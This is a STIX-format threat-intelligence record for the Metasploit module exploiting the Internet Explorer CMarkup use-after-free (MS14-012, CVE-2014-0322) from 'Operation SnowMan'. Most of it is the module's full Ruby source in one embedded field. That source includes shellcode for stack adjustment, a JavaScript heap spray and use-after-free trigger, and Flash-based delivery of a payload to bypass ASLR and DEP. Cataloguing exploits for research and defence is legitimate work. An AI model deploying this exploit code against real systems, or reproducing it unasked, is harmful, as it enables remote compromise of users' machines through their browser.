{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ea69196d-7d8d-4c06-aeeb-0cb90693e960",
    "created": "2024-08-14T16:41:58.39916Z",
    "modified": "2024-08-14T16:41:58.399166Z",
    "name": "\"MS14-012 Microsoft Internet Explorer CMarkup Use-After-Free\"",
    "description": " This module exploits an use after free condition on Internet Explorer as used in the wild as part of \"Operation SnowMan\" in February 2014. The module uses Flash Player 12 in order to bypass ASLR and DEP.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/ms14_012_cmarkup_uaf.rb",
            "external_id": "ms14_012_cmarkup_uaf.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-0322"
        },
        {
            "source_name": "reference",
            "url": "http://www.fireeye.com/blog/technical/cyber-exploits/2014/02/operation-snowman-deputydog-actor-compromises-us-veterans-of-foreign-wars-website.html"
        },
        {
            "source_name": "reference",
            "url": "http://hdwsec.fr/blog/CVE-2014-0322.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::BrowserExploitServer\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"MS14-012 Microsoft Internet Explorer CMarkup Use-After-Free\",\n      'Description'    => %q{\n        This module exploits an use after free condition on Internet Explorer as used in the wild\n        as part of \"Operation SnowMan\" in February 2014. The module uses Flash Player 12 in order to\n        bypass ASLR and DEP.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Unknown', # Vulnerability discovery and Exploit in the wild\n          'Jean-Jamil Khalife', # Exploit\n          'juan vazquez' # Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2014-0322' ],\n          [ 'MSB', 'MS14-012' ],\n          [ 'BID', '65551' ],\n          [ 'URL', 'http://www.fireeye.com/blog/technical/cyber-exploits/2014/02/operation-snowman-deputydog-actor-compromises-us-veterans-of-foreign-wars-website.html'],\n          [ 'URL', 'http://hdwsec.fr/blog/CVE-2014-0322.html' ]\n        ],\n      'Platform'       => 'win',\n      'Arch'           => ARCH_X86,\n      'Payload'        =>\n        {\n          'Space'          => 960,\n          'DisableNops'    => true,\n          'PrependEncoder' => stack_adjust\n        },\n      'BrowserRequirements' =>\n        {\n          :source      => /script|headers/i,\n          :os_name     => 'Windows 7',\n          :ua_name     => Msf::HttpClients::IE,\n          :ua_ver      => '10.0',\n          :mshtml_build => lambda { |ver| ver.to_i < 16843 },\n          :flash       => /^1[23]\\./\n        },\n      'DefaultOptions' =>\n        {\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate',\n          'Retries'              => false\n        },\n      'Targets'        =>\n        [\n          [ 'Windows 7 SP1 / IE 10 / FP 12', { } ],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2014-02-13',\n      'DefaultTarget'  => 0))\n\n  end\n\n  def stack_adjust\n    adjust = \"\\x64\\xa1\\x18\\x00\\x00\\x00\"  # mov eax, fs:[0x18 # get teb\n    adjust << \"\\x83\\xC0\\x08\"             # add eax, byte 8 # get pointer to stacklimit\n    adjust << \"\\x8b\\x20\"                 # mov esp, [eax] # put esp at stacklimit\n    adjust << \"\\x81\\xC4\\x30\\xF8\\xFF\\xFF\" # add esp, -2000 # plus a little offset\n\n    adjust\n  end\n\n  def create_swf\n    path = ::File.join( Msf::Config.data_directory, \"exploits\", \"CVE-2014-0322\", \"AsXploit.swf\" )\n    fd = ::File.open( path, \"rb\" )\n    swf = fd.read(fd.stat.size)\n    fd.close\n    return swf\n  end\n\n  def exploit\n    @swf = create_swf\n    super\n  end\n\n  def on_request_uri(cli, request)\n    print_status(\"Request: #{request.uri}\")\n\n    if request.uri =~ /\\.swf$/\n      print_status(\"Sending SWF...\")\n      send_response(cli, @swf, {'Content-Type'=>'application/x-shockwave-flash', 'Pragma' => 'no-cache'})\n      return\n    end\n\n    super\n  end\n\n  def on_request_exploit(cli, request, target_info)\n    print_status(\"Sending HTML...\")\n    send_exploit_html(cli, exploit_template(cli, target_info))\n  end\n\n  def exploit_template(cli, target_info)\n\n    flash_payload = \"\"\n    padded_payload = get_payload(cli,target_info)\n\n    while padded_payload.length % 4 != 0\n      padded_payload += \"\\x00\"\n    end\n\n    padded_payload.unpack(\"V*\").each do |i|\n      flash_payload << \"0x#{i.to_s(16)},\"\n    end\n    flash_payload.gsub!(/,$/, \"\")\n\n    html_template = %Q|\n    <html>\n    <head>\n    </head>\n    <body>\n\n    <script>\n\n    var g_arr = [];\n    var arrLen = 0x250;\n\n    function dword2data(dword)\n    {\n      var d = Number(dword).toString(16);\n      while (d.length < 8)\n        d = '0' + d;\n\n      return unescape('%u' + d.substr(4, 8) + '%u' + d.substr(0, 4));\n    }\n\n    function eXpl()\n    {\n      var a=0;\n\n      for (a=0; a < arrLen; a++) {\n          g_arr[a] = document.createElement('div');\n      }\n\n      var b = dword2data(0x19fffff3);\n\n      while (b.length < 0x360) {\n        if (b.length == (0x98 / 2))\n        {\n          b += dword2data(0x1a000010);\n        }\n        else if (b.length == (0x94 / 2))\n        {\n          b += dword2data(0x1a111111);\n        }\n        else if (b.length == (0x15c / 2))\n        {\n          b += dword2data(0x42424242);\n        }\n        else\n        {\n          b += dword2data(0x19fffff3);\n        }\n      }\n\n      var d = b.substring(0, ( 0x340 - 2 )/2);\n\n      try{\n        this.outerHTML=this.outerHTML\n      } catch(e){\n\n      }\n\n      CollectGarbage();\n\n      for (a=0; a < arrLen; a++)\n        {\n          g_arr[a].title = d.substring(0, d.length);\n        }\n    }\n\n    function trigger()\n    {\n        var a = document.getElementsByTagName(\"script\");\n        var b = a[0];\n        b.onpropertychange = eXpl;\n        var c = document.createElement('SELECT');\n        c = b.appendChild(c);\n    }\n\n    </script>\n    <embed src=#{rand_text_alpha(4 + rand(3))}.swf FlashVars=\"version=<%=flash_payload%>\" width=\"10\" height=\"10\">\n    </embed>\n    </body>\n    </html>\n    |\n\n    return html_template, binding()\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-02-13",
    "x_mitre_platforms": [
        "win'"
    ]
}